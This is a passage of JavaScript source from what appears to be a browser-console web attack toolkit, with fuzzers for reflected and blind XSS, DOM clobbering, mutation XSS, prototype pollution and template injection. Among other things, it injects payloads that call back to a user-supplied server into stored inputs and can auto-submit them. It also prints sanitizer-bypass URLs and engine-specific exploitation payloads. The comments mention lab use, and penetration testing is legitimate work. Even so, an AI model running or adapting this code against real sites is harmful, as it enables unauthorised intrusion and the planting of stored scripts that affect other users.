              else if (ctx === 'html-attr-event') ctxPri = 8;
              else if (ctx.startsWith('js-')) ctxPri = 7;
              else if (ctx.startsWith('html-attr')) ctxPri = 5;

              if (ctxPri > bestPri) {
                bestPri = ctxPri;
                bestCtx = ctx;
                bestElem = attrNameFinal ? `<${tagName} ${attrNameFinal}="\u2026">` : `<${tagName}>`;
                bestAnal = anal;
              }
            }

            let badge = '';
            if (bestCtx === 'html-attr-href' || bestCtx === 'js-url') badge = ' \uD83D\uDEA8 HIGH';
            else if (bestCtx === 'html-attr-event' || bestCtx.startsWith('js-')) badge = ' \u26A0\uFE0F MED';
            const storedTag = label.includes('stored') ? ' (STORED)' : '';

            ns.log.info(`      %c\u2705 ${fieldName}%c \u2192 %c${bestCtx}%c in ${bestElem}${storedTag}${badge}`,
              'color:#00ddff;font-weight:bold', 'color:#ccc', 'color:#ff00ff;font-weight:bold', 'color:#ccc');
            if (bestAnal) {
              ns.log.info(`         Raw: %c${bestAnal.survived.join(' ') || '(none)'}`, 'color:#00ff00');
              if (bestAnal.encoded.length) ns.log.info(`         Encoded: %c${bestAnal.encoded.join(' ')}`, 'color:#ffaa00');
            }

            results.push({
              form: actionUrl.toString(), method: 'POST', field: fieldName,
              context: bestCtx, element: bestElem, label,
              canary: canary.base, analysis: bestAnal,
            });
          }
        }

        if (!anyFound) {
          ns.log.info(`      \u274C No canaries reflected`);
        }
      } catch (e) {
        ns.log.info(`      \u26A0\uFE0F Error: ${e.message}`);
      } finally {
        form.target = origTarget;
        if (submitIframe && submitIframe.parentNode) {
          try { submitIframe.parentNode.removeChild(submitIframe); } catch (e) { ns.log.debug(e.message); }
        }
      }

      await new Promise(r => setTimeout(r, opts.delayMs));
    }

    return results;
  }

  // =====================================================
  // BLIND XSS — inject callback payloads into stored inputs
  // =====================================================
  function fuzzBlind(callbackUrl, options = {}) {
    if (!callbackUrl) {
      ns.log.info('%c[Blind XSS] Usage: domxss.fuzz.blind("https://your-callback-server.com/probe")', 'color:#ffaa00;font-weight:bold');
      ns.log.info('%c  Injects callback payloads into stored-input vectors (forms, contenteditable, textareas)', 'color:#ccc');
      ns.log.info('%c  The callback URL will be embedded in payloads like <script src=URL> and <img onerror=fetch(URL)>', 'color:#ccc');
      return { injected: [] };
    }

    const opts = { autoSubmit: false, ...options };
    const PAYLOADS = ns.BLIND_XSS_PAYLOADS;

    ns.log.info('%c\n[Blind XSS] Injecting callback payloads...', 'color:#ff6600;font-weight:bold;font-size:13px');
    ns.log.info(`%c  Callback URL: ${callbackUrl}`, 'color:#00ccff');

    // Find stored-input vectors
    const targets = [];
    document.querySelectorAll('form[method="post"] input[type="text"], form[method="post"] input:not([type]), form[method="post"] textarea').forEach(el => {
      targets.push({ element: el, form: el.closest('form'), type: 'form-input' });
    });
    document.querySelectorAll('[contenteditable="true"]').forEach(el => {
      targets.push({ element: el, form: null, type: 'contenteditable' });
    });
    document.querySelectorAll('textarea:not(form[method="post"] textarea)').forEach(el => {
      targets.push({ element: el, form: el.closest('form'), type: 'textarea' });
    });

    if (!targets.length) {
      ns.log.info('%c  No stored-input vectors found on this page', 'color:#888');
      return { injected: [] };
    }

    ns.log.info(`%c  Found ${targets.length} target input(s)`, 'color:#00ff00');
    const injected = [];

    for (const target of targets) {
      for (let i = 0; i < PAYLOADS.length; i++) {
        const payload = PAYLOADS[i](callbackUrl);
        const el = target.element;
        if (el.contentEditable === 'true') {
          el.textContent = payload;
        } else {
          el.value = payload;
          el.dispatchEvent(new Event('input', { bubbles: true }));
          el.dispatchEvent(new Event('change', { bubbles: true }));
        }

        injected.push({ input: el.name || el.id || el.tagName.toLowerCase(), payload, form: target.form?.action || null });

        ns.log.info(`%c  ✓ %c${el.name || el.id || el.tagName}%c ← payload #${i + 1}`, 'color:#00ff00', 'color:#00ccff;font-weight:bold', 'color:#888');

        if (opts.autoSubmit && target.form) {
          target.form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
          ns.log.info(`%c    ↳ Form submitted: ${target.form.action || '(current page)'}`, 'color:#ffaa00');
        }
      }
    }

    ns.log.info(`\n%c[Blind XSS] Done! ${injected.length} injection(s). Check your callback server for hits.`, 'color:#00ff00;font-weight:bold');
    return { injected };
  }

  // =====================================================
  // DOM CLOBBERING — find + test clobberable globals
  // =====================================================
  function fuzzClobbering() {
    const DOM_CLOBBERING = ns.DOM_CLOBBERING;

    ns.log.info('%c\n[DOM Clobbering] Scanning for clobberable globals...', 'color:#ff6600;font-weight:bold;font-size:13px');

    // Scan inline scripts for window.IDENTIFIER references
    const globalRefs = new Set();
    const KNOWN_GLOBALS = /^(jQuery|\$|angular|React|ReactDOM|Vue|ga|gtag|dataLayer|google|gapi|FB|twttr|Modernizr|require|define|exports|module|__webpack_require__|process|Buffer|location|document|navigator|history|screen|performance|console|Math|JSON|Date|Array|Object|String|Number|Boolean|RegExp|Map|Set|Promise|Symbol|Proxy|Reflect|Error|self|top|parent|frames|opener|closed|length|name|status|toolbar|menubar|scrollbars|personalbar|locationbar|statusbar|fetch|XMLHttpRequest|setTimeout|setInterval|clearTimeout|clearInterval|requestAnimationFrame|cancelAnimationFrame|alert|confirm|prompt|print|close|stop|blur|focus|scroll|scrollTo|scrollBy|moveTo|moveBy|resizeTo|resizeBy|getComputedStyle|getSelection|find|atob|btoa|postMessage|addEventListener|removeEventListener|dispatchEvent|matchMedia|crypto|caches|indexedDB|localStorage|sessionStorage|Worker|SharedWorker|ServiceWorker|Notification|Image|Audio|Option|MutationObserver|IntersectionObserver|ResizeObserver|URL|URLSearchParams|AbortController|AbortSignal|Headers|Request|Response|FormData|Blob|File|FileReader|ReadableStream|WritableStream|TransformStream|TextEncoder|TextDecoder|DOMParser|XMLSerializer|Range|Selection|NodeIterator|TreeWalker|CustomEvent|Event|EventTarget|Node|Element|HTMLElement|Document|Window|webpackJsonp|__DOMXSS|domxss|__domxss_running)$/;

    document.querySelectorAll('script:not([src])').forEach(script => {
      const text = script.textContent || '';
      const re = /window\s*\.\s*(\w+)/g;
      let m;
      while ((m = re.exec(text))) {
        if (!KNOWN_GLOBALS.test(m[1])) {
          globalRefs.add(m[1]);
        }
      }
    });

    // Filter to only those where window[name] is currently undefined
    const undefinedGlobals = [];
    for (const name of globalRefs) {
      if (typeof window[name] === 'undefined') {
        undefinedGlobals.push(name);
      }
    }

    if (!undefinedGlobals.length) {
      ns.log.info('%c  No undefined window globals found to clobber', 'color:#888');
      return { tested: [], clobberable: [] };
    }

    ns.log.info(`%c  Found ${undefinedGlobals.length} undefined global(s) referenced in scripts: ${undefinedGlobals.join(', ')}`, 'color:#00ccff');

    const clobberable = [];

    for (const name of undefinedGlobals) {
      for (const entry of DOM_CLOBBERING) {
        const payloadHTML = entry.payload.replace(/\bx\b/g, name).replace('PAYLOAD', 'clobbered');
        const tmp = document.createElement('div');
        tmp.innerHTML = payloadHTML;
        document.body.appendChild(tmp);

        const clobbered = typeof window[name] !== 'undefined';
        document.body.removeChild(tmp);

        if (clobbered) {
          clobberable.push({ name, payload: entry.payload, desc: entry.desc });
          ns.log.info(`%c  ✓ ${name} %c— clobberable via: ${entry.desc}`, 'color:#00ff00;font-weight:bold', 'color:#ccc');
          break;
        }
      }
    }

    if (!clobberable.length) {
      ns.log.info('%c  No globals were clobberable with the tested payloads', 'color:#888');
    } else {
      ns.log.info(`\n%c[DOM Clobbering] ${clobberable.length}/${undefinedGlobals.length} global(s) clobberable!`, 'color:#ff0000;font-weight:bold');
    }

    return { tested: undefinedGlobals, clobberable };
  }

  // =====================================================
  // MUTATION XSS (mXSS) — test browser HTML mutation
  // =====================================================
  function fuzzMXSS() {
    const PAYLOADS = ns.MXSS_PAYLOADS;

    ns.log.info('%c\n[mXSS] Testing browser HTML mutation vectors...', 'color:#ff6600;font-weight:bold;font-size:13px');

    // Detect sanitizer presence
    const hasDOMPurify = typeof window.DOMPurify !== 'undefined';
    const hasTrustedTypes = typeof window.trustedTypes !== 'undefined';
    if (hasDOMPurify) ns.log.info('%c  DOMPurify detected — mutations may bypass it', 'color:#ffaa00');
    if (hasTrustedTypes) ns.log.info('%c  Trusted Types detected', 'color:#ffaa00');

    const results = [];

    for (const entry of PAYLOADS) {
      // Test via innerHTML (not in DOM)
      const tmp = document.createElement('div');
      tmp.innerHTML = entry.input;
      const innerOutput = tmp.innerHTML;
      const innerMutated = entry.check(innerOutput);

      // Test via DOMParser
      let parserOutput = '';
      let parserMutated = false;
      try {
        const doc = new DOMParser().parseFromString(entry.input, 'text/html');
        parserOutput = doc.body ? doc.body.innerHTML : '';
        parserMutated = entry.check(parserOutput);
      } catch (e) { ns.log.debug(e.message); }

      const mutated = innerMutated || parserMutated;
      results.push({ desc: entry.desc, input: entry.input, innerOutput, parserOutput, innerMutated, parserMutated, mutated });

      if (mutated) {
        ns.log.info(`%c  ✓ MUTATION: %c${entry.desc}`, 'color:#00ff00;font-weight:bold', 'color:#ccc');
        if (innerMutated) ns.log.info(`%c    innerHTML: ${truncate(innerOutput, 100)}`, 'color:#00ff00');
        if (parserMutated) ns.log.info(`%c    DOMParser: ${truncate(parserOutput, 100)}`, 'color:#00ff00');
      } else {
        ns.log.info(`%c  ✗ Safe: ${entry.desc}`, 'color:#555');
      }
    }

    const mutationCount = results.filter(r => r.mutated).length;
    if (mutationCount) {
      ns.log.info(`\n%c[mXSS] ${mutationCount}/${results.length} vector(s) caused HTML mutation!`, 'color:#ff0000;font-weight:bold');
      ns.log.info('%c  These mutations may bypass HTML sanitizers like DOMPurify', 'color:#ffaa00');
    } else {
      ns.log.info(`\n%c[mXSS] No mutations detected (${results.length} vectors tested)`, 'color:#00ff00;font-weight:bold');
    }

    return results;
  }

  // =====================================================
  // PROTOTYPE POLLUTION — detect pollutable gadgets + XSS chains
  // =====================================================
  function fuzzPrototype() {
    const GADGETS = [...ns.PROTO_POLLUTION_GADGETS, 'transport_url', 'sequence', 'hitCallback'];

    ns.log.info('%c\n[Proto Pollution] Testing prototype pollution gadgets...', 'color:#ff6600;font-weight:bold;font-size:13px');

    const exploitable = [];

    for (const prop of GADGETS) {
      const saved = Object.prototype[prop];
      const hadOwn = Object.prototype.hasOwnProperty.call(Object.prototype, prop);
      try {
        Object.prototype[prop] = 'xSsProtoTest';

        // Check if any DOM element picked up the polluted value
        let picked = false;
        const els = document.querySelectorAll('div, span, a, img, iframe, script, input, form, button');
        for (const el of els) {
          try {
            if (el[prop] === 'xSsProtoTest') {
              picked = true;
              break;
            }
          } catch (e) { ns.log.debug(e.message); }
        }

        if (picked) {
          exploitable.push(prop);
          ns.log.info(`%c  ✓ ${prop} %c— DOM elements inherit polluted value!`, 'color:#ff0000;font-weight:bold', 'color:#ffaa00');
        } else {
          ns.log.info(`%c  ✗ ${prop} — not picked up by DOM`, 'color:#555');
        }
      } finally {
        // Immediately revert
        if (hadOwn) {
          Object.prototype[prop] = saved;
        } else {
          delete Object.prototype[prop];
        }
      }
    }

    // Scan all scripts (inline + external) for entry points
    const entryPoints = [];
    const scanScriptText = (text, label) => {
      if (/JSON\s*\.\s*parse\s*\(\s*(location|window\.location|document\.location)/.test(text)) {
        entryPoints.push({ file: label, pattern: 'JSON.parse(location...)' });
        ns.log.info(`%c  ⚠ Entry point: JSON.parse(location...) in ${label}`, 'color:#ffaa00;font-weight:bold');
      }
      if (/deparam|deparameterize|parseParams|queryStringToObject/i.test(text)) {
        entryPoints.push({ file: label, pattern: 'Custom URL parameter parser' });
        ns.log.info(`%c  ⚠ Entry point: URL parameter parser in ${label}`, 'color:#ffaa00;font-weight:bold');
      }
      if (/__proto__/i.test(text) && !/['"]__proto__['"]\s*[!=]/i.test(text)) {
        entryPoints.push({ file: label, pattern: '__proto__ reference (not sanitized)' });
      }
      if (/Object\s*\.\s*assign|_\s*\.\s*merge|_\s*\.\s*defaultsDeep|\$\s*\.\s*extend\s*\(\s*true/i.test(text)) {
        entryPoints.push({ file: label, pattern: 'Deep merge function' });
        ns.log.info(`%c  ⚠ Entry point: Deep merge function in ${label}`, 'color:#ffaa00;font-weight:bold');
      }
      // Gadget: eval(*.sequence) — manager.sequence → eval() chain
      if (/eval\s*\(\s*\w+\.\s*sequence/i.test(text)) {
        entryPoints.push({ file: label, pattern: 'eval(*.sequence) — pollute sequence for code execution' });
        ns.log.info(`%c  ⚠ Gadget: eval(*.sequence) in ${label}`, 'color:#ff0000;font-weight:bold');
      }
      // Gadget: script.src = *.transport_url
      if (/\.src\s*=\s*\w+\.\s*transport_url/i.test(text)) {
        entryPoints.push({ file: label, pattern: 'script.src = *.transport_url — pollute transport_url for script injection' });
        ns.log.info(`%c  ⚠ Gadget: script.src = *.transport_url in ${label}`, 'color:#ff0000;font-weight:bold');
      }
      // Gadget: setTimeout(*.hitCallback) — Google Analytics gadget
      if (/setTimeout\s*\(\s*\w+\.\s*hitCallback/i.test(text) || /hitCallback/i.test(text)) {
        entryPoints.push({ file: label, pattern: 'hitCallback → setTimeout() — Google Analytics gadget' });
        ns.log.info(`%c  ⚠ Gadget: hitCallback → setTimeout() in ${label}`, 'color:#ff0000;font-weight:bold');
      }
    };

    document.querySelectorAll('script:not([src])').forEach((script, idx) => {
      const text = script.textContent || '';
      if (text.trim()) scanScriptText(text, `(inline-${idx})`);
    });

    // Scan cached external scripts
    if (ns._extScriptCache) {
      for (const [src, code] of ns._extScriptCache) {
        scanScriptText(code, src.split('/').pop().split('?')[0]);
      }
    }

    // Scan external scripts too
    document.querySelectorAll('script[src]').forEach(script => {
      const src = script.src;
      if (!src) return;
      const filename = src.split('/').pop().split('?')[0];
      // Skip common libraries
      if (/jquery|angular|react|vue|lodash|underscore|backbone|bootstrap|polyfill|vendor|bundle\.min/i.test(filename)) return;
      // Use cached text from seenScripts if available via performance entries
      entryPoints.push({ file: filename, pattern: '(external script — scan via browser DevTools Sources)', url: src });
    });

    // Test URL-based __proto__ injection (for Labs 35-36)
    ns.log.info('%c\n  Testing URL-based __proto__ injection...', 'color:#ccc');
    const urlPollutionResults = [];
    const testProps = ['__domxss_pp_test'];
    for (const prop of testProps) {
      const saved = Object.prototype[prop];
      const hadOwn = Object.prototype.hasOwnProperty.call(Object.prototype, prop);
      try {
        // Test bracket notation: ?__proto__[prop]=value
        const testUrl = new URL(location.href);
        testUrl.searchParams.set('__proto__[' + prop + ']', 'polluted');
        // We can't navigate, but we can check if the page's JS parses these params
        // Instead, check if the current URL already has __proto__ params
        const currentParams = location.search + location.hash;
        if (/__proto__|constructor\s*\[?\s*['"]?prototype/.test(currentParams)) {
          urlPollutionResults.push({ vector: 'URL contains __proto__/constructor.prototype', url: location.href });
          ns.log.info(`%c  ⚠ Current URL contains prototype pollution vectors!`, 'color:#ff0000;font-weight:bold');
        }
      } finally {
        if (hadOwn) { Object.prototype[prop] = saved; } else { delete Object.prototype[prop]; }
      }
    }

    // Test constructor.prototype vector alongside __proto__
    ns.log.info('%c\n  Testing sanitization bypass vectors...', 'color:#ccc');
    const bypassVectors = [
      { vector: 'constructor.prototype.X=Y', urlKey: 'constructor.prototype.__domxss_pp_test', desc: 'constructor.prototype alternative' },
      { vector: '__pro__proto__to__[X]=Y', urlKey: '__pro__proto__to__[__domxss_pp_test]', desc: 'Recursive strip bypass: __pro__proto__to__' },
      { vector: 'constconstructorructor.protoprototypetype', urlKey: 'constconstructorructor.protoprototypetype.__domxss_pp_test', desc: 'Recursive strip bypass: constructor/prototype' },
    ];
    for (const bv of bypassVectors) {
      ns.log.info(`%c  → ${bv.desc}: %c?${bv.urlKey}=polluted`, 'color:#ccc', 'color:#00ff00;font-family:monospace');
    }

    if (exploitable.length) {
      ns.log.info(`\n%c[Proto Pollution] ${exploitable.length}/${GADGETS.length} gadget(s) exploitable: ${exploitable.join(', ')}`, 'color:#ff0000;font-weight:bold');
    } else {
      ns.log.info(`\n%c[Proto Pollution] No exploitable gadgets found (${GADGETS.length} tested)`, 'color:#00ff00;font-weight:bold');
    }
    if (entryPoints.length) {
      ns.log.info(`%c  ${entryPoints.length} potential pollution entry point(s) in code`, 'color:#ffaa00');
    }
    if (exploitable.length && entryPoints.length) {
      ns.log.info('%c\n  Suggested test URLs:', 'color:#00ccff;font-weight:bold');
      for (const prop of exploitable) {
        ns.log.info(`%c  ?__proto__[${prop}]=data:,alert(1);`, 'color:#00ff00;font-family:monospace');
        ns.log.info(`%c  ?__proto__.${prop}=data:,alert(1);`, 'color:#00ff00;font-family:monospace');
        ns.log.info(`%c  ?constructor.prototype.${prop}=data:,alert(1);`, 'color:#00ff00;font-family:monospace');
        ns.log.info(`%c  ?__pro__proto__to__[${prop}]=data:,alert(1);`, 'color:#00ff00;font-family:monospace');
      }
    }

    return { gadgets: GADGETS, exploitable, entryPoints, urlPollutionResults, bypassVectors };
  }

  // =====================================================
  // SSTI / Template Injection Detection
  // =====================================================

  const SSTI_PAYLOADS = ns.SSTI_PAYLOADS;
  const SSTI_DEBUG_PAYLOADS = ns.SSTI_DEBUG_PAYLOADS;
  const SSTI_FINGERPRINT = ns.SSTI_FINGERPRINT;

  /**
   * Fuzz all forms on the page for Server-Side Template Injection.
   * Injects SSTI canary expressions into text/textarea fields, submits each
   * form via a hidden iframe, then analyses the response HTML for evaluated
   * results (e.g. 49 for {{7*7}}).  Also re-fetches the current page to
   * detect stored SSTI.
   */
  async function fuzzTemplateInjection(options = {}) {
    const opts = {
      delayMs: CONFIG.delays.betweenTests,
      ...options,
    };

    ns.log.info('%c\u2550\u2550 SSTI / Template Injection Fuzzing \u2550\u2550', 'font-weight:bold;color:#ff00ff;font-size:13px');

    const forms = document.querySelectorAll('form');
    if (forms.length === 0) {
      ns.log.info('   %cNo forms found on this page', 'color:#888');
      return [];
    }

    ns.log.info(`   ${forms.length} form(s) found`);
    const results = [];

    for (const form of forms) {
      const actionUrl = new URL(form.action || location.href, location.href);
      const method = (form.method || 'GET').toUpperCase();
      ns.log.info(`\n   \uD83D\uDCDD Form [${method}]: ${actionUrl.pathname}`);

      const inputs = form.querySelectorAll('input[name], textarea[name], select[name]');

      // Map each editable field to its assigned SSTI payload index
      const fieldPayloadMap = new Map();
      let payloadIdx = 0;
      for (const inp of inputs) {
        const type = (inp.type || 'text').toLowerCase();
        if (['hidden', 'submit', 'button', 'reset', 'file', 'image', 'checkbox', 'radio'].includes(type)) {
          if (type === 'hidden') inp.value = inp.defaultValue || inp.value || '';
          continue;
        }
        if (inp.tagName === 'SELECT') continue;

        // Assign a payload from the SSTI_PAYLOADS list (round-robin)
        const payload = SSTI_PAYLOADS[payloadIdx % SSTI_PAYLOADS.length];
        fieldPayloadMap.set(inp.name || '?', { payload, input: inp });
        inp.value = payload.expr;
        ns.log.info(`      \uD83D\uDD11 %c${inp.name || '?'}%c = %c${payload.expr}`, 'color:#00ddff;font-weight:bold', 'color:#ccc', 'color:#ff00ff');
        payloadIdx++;
      }

      if (fieldPayloadMap.size === 0) {
        ns.log.info('      %c(no injectable fields)', 'color:#888');
        continue;
      }

      // Fill empty non-hidden fields with filler values
      for (const inp of inputs) {
        const type = (inp.type || 'text').toLowerCase();
        if (['hidden', 'submit', 'button', 'reset', 'file', 'image', 'checkbox', 'radio'].includes(type)) continue;
        if (inp.tagName === 'SELECT') continue;
        if (!inp.value) inp.value = getFillerValue(inp);
      }

      // Submit form via hidden iframe (same pattern as fuzzPostForms)
      let submitIframe = null;
      const origTarget = form.target || '';
      try {
        const iframeName = `__domxss_ssti_${Date.now()}`;
        submitIframe = document.createElement('iframe');
        submitIframe.name = iframeName;
        submitIframe.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none';
        document.body.appendChild(submitIframe);
        form.target = iframeName;
        const submitDone = new Promise(resolve => {
          submitIframe.onload = () => resolve(true);
          submitIframe.onerror = () => resolve(false);
          setTimeout(() => resolve(false), CONFIG.delays.longTimeout);
        });
        form.submit();
        const loaded = await submitDone;

        // Collect HTML from iframe response + stored page
        const htmlSources = [];
        if (loaded && submitIframe.contentDocument) {
          try {
            htmlSources.push({ html: submitIframe.contentDocument.documentElement.outerHTML, label: `${method} response` });
          } catch (e) { ns.log.debug(e.message); }
        }
        await new Promise(r => setTimeout(r, CONFIG.delays.postRedirect));
        try {
          const viewResp = await fetch(location.href, {
            credentials: 'same-origin', headers: { 'Accept': 'text/html' },
            cache: 'no-store',
          });
          if (viewResp.ok) {
            htmlSources.push({ html: await viewResp.text(), label: 'stored (view page)' });
          }
        } catch (e) { ns.log.debug(e.message); }

        // Analyse each HTML source for evaluated SSTI results
        let anyFound = false;
        for (const { html, label } of htmlSources) {
          for (const [fieldName, { payload }] of fieldPayloadMap) {
            // Check if the expression was evaluated (result appears in HTML)
            const resultPresent = html.includes(payload.result);
            // Also check if the raw expression was reflected (not evaluated = safe)
            const rawReflected = html.includes(payload.expr);

            if (!resultPresent) continue;

            // Avoid false positives: if the result is a common string like '49'
            // require it to appear without the raw expression alongside
            // (if the raw expr is also present, the engine likely did NOT evaluate it)
            if (rawReflected && payload.result === '49') {
              // Result '49' is common — only flag if we see the result without the expression nearby
              // Check for result NOT inside the expression context
              let falsePositive = true;
              const resultIdx = html.indexOf(payload.result);
              if (resultIdx !== -1) {
                const surrounding = html.substring(
                  Math.max(0, resultIdx - 50),
                  Math.min(html.length, resultIdx + 50)
                );
                if (!surrounding.includes(payload.expr)) {
                  falsePositive = false;
                }
              }
              if (falsePositive) continue;
            }

            anyFound = true;

            // Fingerprint the template engine
            const fpKey = `${payload.result}_${payload.expr}`;
            const fingerprintEngines = SSTI_FINGERPRINT[fpKey] || payload.engines;

            // Determine severity
            let severity = 'HIGH';
            let severityColor = '#ff0000';
            const storedTag = label.includes('stored') ? ' (STORED)' : '';
            if (storedTag) {
              severity = 'CRITICAL';
              severityColor = '#ff0000';
            }

            ns.log.info(
              `      %c\u2705 SSTI CONFIRMED%c — field %c${fieldName}%c: %c${payload.expr}%c \u2192 %c${payload.result}%c  [${severity}]${storedTag}`,
              `color:${severityColor};font-weight:bold`, 'color:#ccc',
              'color:#00ddff;font-weight:bold', 'color:#ccc',
              'color:#ff00ff;font-weight:bold', 'color:#ccc',
              'color:#00ff00;font-weight:bold', 'color:#ccc'
            );
            ns.log.info(
              `         Engine(s): %c${fingerprintEngines.join(', ')}`,
              'color:#ffaa00;font-weight:bold'
            );
            ns.log.info(`         Source: %c${label}`, 'color:#888');

            // Suggest debug/exploitation payloads for matched engines
            const debugPayloads = SSTI_DEBUG_PAYLOADS.filter(dp =>
              dp.engines.some(eng =>
                fingerprintEngines.some(fp => fp.toLowerCase().includes(eng.toLowerCase()) || eng.toLowerCase().includes(fp.toLowerCase()))
              )
            );
            if (debugPayloads.length) {
              ns.log.info('         %cExploitation payloads:', 'color:#ff6600;font-weight:bold');
              for (const dp of debugPayloads) {
                ns.log.info(`           %c${dp.expr}%c — ${dp.desc} [${dp.engines.join(', ')}]`,
                  'color:#00ff00;font-family:monospace', 'color:#ccc');
              }
            }

            results.push({
              form: actionUrl.toString(), method, field: fieldName,
              expression: payload.expr, evaluatedResult: payload.result,
              engines: fingerprintEngines, severity, label,
              debugPayloads: debugPayloads.map(dp => ({ expr: dp.expr, desc: dp.desc, engines: dp.engines })),
            });
          }
        }

        if (!anyFound) {
          ns.log.info('      \u274C No SSTI detected (expressions not evaluated)');
        }
      } catch (e) {
        ns.log.info(`      \u26A0\uFE0F Error: ${e.message}`);
      } finally {
        form.target = origTarget;
        if (submitIframe && submitIframe.parentNode) {
          try { submitIframe.parentNode.removeChild(submitIframe); } catch (e) { ns.log.debug(e.message); }
        }
      }

      // Now re-inject with ALL payloads to maximize detection surface
      // Submit one round per unique payload for multi-engine coverage
      if (payloadIdx < SSTI_PAYLOADS.length) {
        for (let pi = payloadIdx; pi < SSTI_PAYLOADS.length; pi++) {
          const extraPayload = SSTI_PAYLOADS[pi];
          for (const [, { input: inp }] of fieldPayloadMap) {
            inp.value = extraPayload.expr;
          }

          let extraIframe = null;
          const origTarget2 = form.target || '';
          try {
            const iframeName2 = `__domxss_ssti2_${Date.now()}_${pi}`;
            extraIframe = document.createElement('iframe');
            extraIframe.name = iframeName2;
            extraIframe.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none';
            document.body.appendChild(extraIframe);
            form.target = iframeName2;
            const done2 = new Promise(resolve => {
              extraIframe.onload = () => resolve(true);
              extraIframe.onerror = () => resolve(false);
              setTimeout(() => resolve(false), CONFIG.delays.longTimeout);
            });
            form.submit();
            const loaded2 = await done2;

            const htmlSources2 = [];
            if (loaded2 && extraIframe.contentDocument) {
              try {
                htmlSources2.push({ html: extraIframe.contentDocument.documentElement.outerHTML, label: `${method} response` });
              } catch (e) { ns.log.debug(e.message); }
            }

            for (const { html, label } of htmlSources2) {
              if (!html.includes(extraPayload.result)) continue;
              if (html.includes(extraPayload.expr) && extraPayload.result === '49') {
                const rIdx = html.indexOf(extraPayload.result);
                if (rIdx !== -1) {
                  const surr = html.substring(Math.max(0, rIdx - 50), Math.min(html.length, rIdx + 50));
                  if (surr.includes(extraPayload.expr)) continue;
                }
              }

              const fpKey = `${extraPayload.result}_${extraPayload.expr}`;
              const fpEngines = SSTI_FINGERPRINT[fpKey] || extraPayload.engines;

              ns.log.info(
                `      %c\u2705 SSTI CONFIRMED%c (extra round) — %c${extraPayload.expr}%c \u2192 %c${extraPayload.result}%c  Engine(s): %c${fpEngines.join(', ')}`,
                'color:#ff0000;font-weight:bold', 'color:#ccc',
                'color:#ff00ff;font-weight:bold', 'color:#ccc',
                'color:#00ff00;font-weight:bold', 'color:#ccc',
                'color:#ffaa00;font-weight:bold'
              );

              const debugPayloads = SSTI_DEBUG_PAYLOADS.filter(dp =>
                dp.engines.some(eng =>
                  fpEngines.some(fp => fp.toLowerCase().includes(eng.toLowerCase()) || eng.toLowerCase().includes(fp.toLowerCase()))
                )
              );

              results.push({
                form: actionUrl.toString(), method, field: '(all fields)',
                expression: extraPayload.expr, evaluatedResult: extraPayload.result,
                engines: fpEngines, severity: 'HIGH', label,
                debugPayloads: debugPayloads.map(dp => ({ expr: dp.expr, desc: dp.desc, engines: dp.engines })),
              });
            }
          } catch (e) { ns.log.debug(e.message); } finally {
            form.target = origTarget2;
            if (extraIframe && extraIframe.parentNode) {
              try { extraIframe.parentNode.removeChild(extraIframe); } catch (e) { ns.log.debug(e.message); }
            }
          }

          await new Promise(r => setTimeout(r, opts.delayMs));
        }
      }

      await new Promise(r => setTimeout(r, opts.delayMs));
    }

    // Summary
    if (results.length > 0) {
      ns.log.info(`\n%c[SSTI] ${results.length} template injection(s) found!`, 'color:#ff0000;font-weight:bold;font-size:13px');
      const uniqueEngines = [...new Set(results.flatMap(r => r.engines))];
      ns.log.info(`%c  Detected engine(s): ${uniqueEngines.join(', ')}`, 'color:#ffaa00;font-weight:bold');
    } else {
      ns.log.info('\n%c[SSTI] No template injection detected', 'color:#00ff00;font-weight:bold');
    }

    return results;
  }

  Object.assign(ns.fuzzer, {
    wafEnumerate, detectCSP, fuzzJSProtocol, fuzzDanglingMarkup, fuzzPostForms,
    fuzzBlind, fuzzClobbering, fuzzMXSS, fuzzPrototype, fuzzTemplateInjection,
  });
})();
